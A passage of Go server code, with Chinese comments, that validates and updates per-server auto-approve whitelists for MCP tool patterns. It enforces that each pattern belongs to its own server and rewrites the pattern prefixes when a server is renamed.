		seen[value] = true
		out = append(out, value)
	}
	return out, nil
}

// normalizeAutoApproveForServer 在通用形态校验之外，再限定 MCP 模式必须属于本 server。
// 三个写入入口（create / 整表 PATCH / 专用 PUT）共用这一份判据：白名单按 server 存放，
// 允许一条 server 写 `mcp__other__*` 等于让它替别的 server 放行工具。
func normalizeAutoApproveForServer(values []string, serverName string) ([]string, error) {
	patterns, err := normalizeMCPAutoApprovePatterns(values)
	if err != nil {
		return nil, err
	}
	prefix := "mcp__" + serverName + "__"
	for _, pattern := range patterns {
		if strings.HasPrefix(pattern, "mcp__") && !strings.HasPrefix(pattern, prefix) {
			return nil, fmt.Errorf("模式 %q 不属于本 server（应以 %s 开头）", pattern, prefix)
		}
	}
	return patterns, nil
}

// applyAutoApproveEdits 计算整表 PATCH 后的白名单：改名时先重写前缀，只对**不在旧集合
// 里**的条目做形态/归属校验。这样历史非法值（如 mcp__*）只要用户没动就继续保留，
// 重排、改名也不会把整条保存卡死；新增或改写的模式仍会被严格校验。
func applyAutoApproveEdits(patterns, current []string, oldName, newName string) ([]string, error) {
	carried := map[string]bool{}
	for _, pattern := range rewriteAutoApproveServerPrefix(current, oldName, newName) {
		if trimmed := strings.TrimSpace(pattern); trimmed != "" {
			carried[trimmed] = true
		}
	}
	out := []string{}
	seen := map[string]bool{}
	for _, pattern := range rewriteAutoApproveServerPrefix(patterns, oldName, newName) {
		trimmed := strings.TrimSpace(pattern)
		if trimmed == "" || seen[trimmed] {
			continue
		}
		seen[trimmed] = true
		if !carried[trimmed] {
			if _, err := normalizeAutoApproveForServer([]string{trimmed}, newName); err != nil {
				return nil, err
			}
		}
		out = append(out, trimmed)
	}
	return out, nil
}

func stringPtr(value string) *string {
	return &value
}

// rewriteAutoApproveServerPrefix 在 server 改名时把白名单里的旧名前缀换成新名，
// 避免「改个名字就再也保存不了」或改名后免审批静默失效。
func rewriteAutoApproveServerPrefix(patterns []string, oldName, newName string) []string {
	if oldName == "" || oldName == newName {
		return patterns
	}
	oldPrefix := "mcp__" + oldName + "__"
	newPrefix := "mcp__" + newName + "__"
	out := make([]string, 0, len(patterns))
	for _, pattern := range patterns {
		trimmed := strings.TrimSpace(pattern)
		if strings.HasPrefix(trimmed, oldPrefix) {
			out = append(out, newPrefix+strings.TrimPrefix(trimmed, oldPrefix))
			continue
		}
		out = append(out, trimmed)
	}
	return out
}

// updateMCPServerAutoApprove 单独更新一条 server 的自动放行白名单。
// 与整表 PATCH 分开，是因为前端在「工具列表」里逐个勾选时只改这一个字段，
// 走整表 PATCH 会把其它字段的零值语义卷进来。
func (s *Server) updateMCPServerAutoApprove(w http.ResponseWriter, r *http.Request) {
	serverID := chi.URLParam(r, "serverID")
	var input mcpAutoApproveInput
	if !decode(w, r, &input) {
		return
	}
	s.mcpWriteMu.Lock()
	defer s.mcpWriteMu.Unlock()
	ctx := r.Context()
	stored, err := s.fetchStoredMCPServer(ctx, serverID)
	if errors.Is(err, sql.ErrNoRows) {
		writeError(w, http.StatusNotFound, errors.New("MCP server not found"))
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	patterns, err := normalizeAutoApproveForServer(input.Patterns, stored.Name)
	if err != nil {
		writeError(w, http.StatusBadRequest, err)
		return
	}
	autoApproveJSON, _ := marshalStringSlice(patterns)
	if _, err := s.db.ExecContext(ctx, `update mcp_servers set auto_approve_tools=?,updated_at=? where id=?`,
		autoApproveJSON, time.Now().UTC(), serverID); err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	updated, err := s.fetchMCPServer(ctx, serverID)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	writeJSON(w, http.StatusOK, updated)
}
